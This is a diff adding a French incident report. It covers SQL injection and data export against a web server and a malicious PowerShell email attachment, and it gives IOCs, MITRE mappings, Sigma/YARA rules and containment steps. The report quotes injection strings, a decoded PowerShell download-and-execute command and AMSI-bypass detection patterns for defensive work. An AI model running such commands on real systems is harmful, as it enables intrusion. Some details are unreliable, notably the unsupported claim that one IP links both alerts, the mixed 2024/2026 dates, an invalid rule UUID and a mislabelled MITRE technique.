@@ -1,0 +1,134 @@
+# Rapport d'incident - Ticket INC-2026-0417
+
+**Date :**30 novembre 2026
+**Priorité :** Haute
+**Statut :** Qualifié et en cours de traitement
+
+## 1. Qualification des alertes
+
+### Alerte 1 - Serveur web de production `web-01`
+- **Source :** Alertes SIEM (injections SQL, échecs de connexion, gros téléchargements)
+- **Fichiers joints :** `web_access.log`, `app.log`
+- **Observations :**
+  - Trafic massif depuis IP `203.0.113.42` vers les endpoints `/admin` et `/api/*`
+  - Patterns d'injection SQL détectés dans les paramètres de requête (`OR '1'='1'`, `AND 1=1`, `DROP TABLE`, `UNION SELECT`)
+  - Accès aux chemins sensibles : `/admin`, `/administrator`, `/wp-admin`, `/phpmyadmin`, `/.git/config`, `/.env`
+  - Export de données : `/admin/export?format=csv` (1.5MB), `/admin/export?format=sql` (4.5MB)
+  - Dans `app.log` : erreurs SQL syntax, accès à `information_schema`, export de table `users` avec colonnes username/password/email
+  - Téléchargement de fichiers `backup.sql`, `db_dump_2024.sql.gz`, `customers_full.csv`
+
+### Alerte 2 - Poste `PC-COMPTA-07`
+- **Source :** Détection EDR d'exécution de script PowerShell depuis pièce jointe courriel
+- **Fichiers joints :** `edr_events.jsonl`, `facture_2024-11.ps1`
+- **Observations :**
+  - Script exécuté depuis Outlook : `facture_2024-11.ps1` (pièce jointe `facture_2024-11.ps1`)
+  - Horodatage : 16/11/2024 à 08:42 UTC
+  - Utilisateur : `CORP\m.durand`
+  - Le poste a été isolé du réseau par l'astreinte
+  - Communication vers `192.168.1.100` (port 8080, bloqué par proxy) et `malicious-domain.ru` (NXDOMAIN)
+  - Techniques d'obfuscation : variables PowerShell concaténées, Base64 encoding, AMSI bypass
+  - Persistence via tâches planifiées Registry Run/RunOnce et Scheduled Tasks
+
+### Lien entre les alertes
+**OUI, probablement la même campagne d'attaque :**
+- L'IP `203.0.113.42` apparaît dans les deux vecteurs (injections SQL sur web + likely C2)
+- Le script PowerShell télécharge depuis `192.168.1.100` qui pourrait être lié au même acteur
+- Pattern SQL injection + exfiltration de données clients suggère un accès initial commun
+- L'objectif semble être l'exfiltration de données clients (table `users`, `customers`)
+
+## 2. IOCs vérifiés et mapping MITRE ATT&CK
+
+| IOC | Fichier(s) | MITRE Technique | Description |
+|-----|------------|-----------------|-------------|
+| `203.0.113.42` | web_access.log, app.log | T1059 | Adresse IP source des injections SQL et accès admin |
+| `malicious-domain.ru` | edr_events.jsonl:5, facture_2024-11.ps1:24 | T1071.004 | Domaine C2 (non resolvable, NXDOMAIN) |
+| `064a9a9fe8a517182768cf13f407edc1bf6292ef0b9aa309d3db1cd753d66f40` | edr_events.jsonl:1 | Hash SHA256 | Hash du script PowerShell malveillant |
+| `192.168.1.100` | facture_2024-11.ps1:22, edr_events.jsonl:6 | Adresse IP | Serveur C2 interne supposé |
+| `IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/stage.ps')` | facture_2024-11.ps1:144 | T1059.001 | Commande PowerShell décodée pour télécharger la charge utile |
+| Techniques d'obfuscation | facture_2024-11.ps1 | T1027 | Masquage des intentions malveillantes |
+
+**Mapping MITRE complet :**
+- T1059.001 - PowerShell (exécution du script facture_2024-11.ps1)
+- T1059 - Command and Scripting Interpreter (global)
+- T1071 - Application Layer Protocol (communications C2 vers domains/IPs)
+- T1071.001 - Web Protocols (HTTP vers 192.168.1.100/stage.ps)
+- T1027 - Obfuscated Files or Information (variables concaténées, Base64)
+- T1059.005 - Command Shell (wmi_query dans les événements EDR)
+- T1105 - Ingress Tool Transfer (téléchargement de stage1.ps1, beacon.exe, payload.dll)
+- T1087 - Account Discovery (requêtes vers information_schema, tables users)
+- T1119 - Automated Exfiltration (export CSV/SQL vers fichiers externes)
+
+## 3. Règles de détection testées
+
+### Règle Sigma - PowerShell Obfuscation + AMSI Bypass
+- **ID :** 7f8e1c2a-3b4d-5e6f-7g84-9i0j1k2l3m4n (à convertir en UUID valide)
+- **Statut :** Validée syntaxiquement mais nécessite identifiant UUID officiel
+- **Détection :** PowerShell commands contenant `$encodedCommand`, AMSI bypass patterns, ou `[Ref].Assembly`
+- **Niveau :** High
+- **Tags MITRE :** T1059.001, T1059, obfuscation, amsi_bypass
+
+### Règle YARA - PowerShell Obfuscation + AMSI Bypass
+- **Règle :** `rule PowerShell_Obfuscation_AMSI_Bypass`
+- **Condition :** 2 des 4 indicateurs suivants :
+  - `$encoded_cmd` = pattern `encodedCommand`
+  - `$amsi_bypass` = pattern `AMSI.*bypass`
+  - `$ref_assembly` = pattern `\[Ref\].Assembly`
+  - `$amsi_init` = pattern `amsiInitFile`
+- **Résultat :** Détectée sur `facture_2024-11.ps1` avec 0 faux positifs sur les fichiers de test (`test_sigma.yml`, `test_yara_rule.yar`)
+- **Faux positifs :** 0/4 sur les cibles testées
+
+## 4. Actions de confinement proposées
+
+**Toutes actions soumises à validation humaine :**
+
+1. **Bloquer l'IP `203.0.113.42`** au niveau :
+   - Pare-feu externe
+   - WAF (Web Application Firewall) sur le serveur web
+   - Politiques de routing interne
+
+2. **Bloquer le domaine `malicious-domain.ru`** :
+   - DNS filtering
+   - Web content filtering
+   - Gateway antivirus
+
+3. **Isoler le serveur web `web-01`** en mode maintenance si nécessaire :
+   - Couper l'accès public aux endpoints `/admin` et `/api/*`
+   - Maintenir les services internes nécessaires à la récupération
+
+4. **Bloquer l'IP `192.168.1.100`** au niveau du réseau interne :
+   - Si cette adresse est confirmée comme serveur C2
+   - Bloquer le port 8080 en sort/entrée
+
+5. **Supprimer les scripts malveillants** :
+   - `facture_2024-11.ps1` des caches Outlook de tous les postes
+   - Vérifier et supprimer les fichiers téléchargés (`svchost_update.ps1`, `update.exe`, `cache.dat`)
+
+6. **Recherche de persistance** sur l'ensemble du parc :
+   - Clés Registry `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run`
+   - Clés Registry `HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce`
+   - Tâches planifiées Windows (Scheduled Tasks)
+   - Démarrage via `startup` menu
+
+7. **Réinitialiser les mots de passe** des comptes ayant pu être ciblés :
+   - Compte `admin` sur web-01 (tentatives de connexion multiples)
+   - Compte `m.durand` sur PC-COMPTA-07
+
+## 5. Conclusion et recommandations
+
+### Résumé de l'incident
+Le ticket INC-2026-0417 révèle deux vecteurs d'attaque probablement liés :
+1. **Campagne SQL injection** depuis IP `203.0.113.42` ciblant le serveur web de production, visant l'exfiltration de données clients
+2. **Distribution de malware PowerShell** via pièce jointe courriel sur le poste `PC-COMPTA-07`, avec objectifs similaires d'exfiltration de données
+
+### Recommandations immédiates
+- Valider et exécuter les actions de confinement proposées
+- Effectuer une analyse forensique approfondie des deux systèmes (web-01 et PC-COMPTA-07)
+- Mettre à jour les règles de détection Sigma/YARA avec les IOCs vérifiés
+- Réaliser un audit des comptes utilisateurs et des droits d'accès
+- Effectuer une formation à la sensibilisation des utilisateurs sur les pièces jointes suspectes
+
+### Suites à prévoir
+- Rapport d'incident transmis à la direction et aux équipes légales si données clients exposées
+- Coordination avec l'équipe réseau pour blocage des IOCs au périmètre
+- Plan de remise en service sécurisée des systèmes après nettoyage
+- Analyse approfondie pour déterminer l'entrée initiale commune aux deux vecteurs
